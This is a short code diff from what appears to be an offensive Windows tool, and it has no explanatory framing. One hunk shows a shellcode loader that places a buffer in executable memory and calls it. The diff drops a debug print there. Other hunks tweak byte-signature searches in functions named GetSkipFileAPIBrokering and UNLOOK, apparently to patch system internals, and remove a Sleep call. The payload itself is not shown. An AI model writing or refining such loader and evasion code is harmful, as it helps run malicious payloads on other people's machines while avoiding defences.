@@ -13,7 +13,7 @@ void runShellcode() {
     LPVOID shellcode = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, 0x40);
 
     memcpy(shellcode, buf, sizeof(buf));
-    printf("%x \n", shellcode);
+    
     void(*func)();
     func = (void(*)())shellcode;
     func();
@@ -236,7 +236,7 @@ size_t GetSkipFileAPIBrokering(VOID)
     unsigned char win7_lock_count_flag[] = {0xF0, 0x44, 0x0F, 0xB1, 0x35};
 #else
     unsigned char lock_count_flag[] = {0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00, 0xE8};
-    unsigned char win7_lock_count_flag[] = {0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB};
+    unsigned char win7_lock_count_flag[] = {0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0xD8};
 #endif
 
 VOID UNLOOK()
@@ -289,7 +289,6 @@ VOID UNLOOK()
     }
 
     addr = memFind(textData, win7_lock_count_flag, (size_t)textData + rdataLength, sizeof(win7_lock_count_flag));
-    Sleep(1);
     if (addr != 0)
     {   
 #ifdef _WIN64
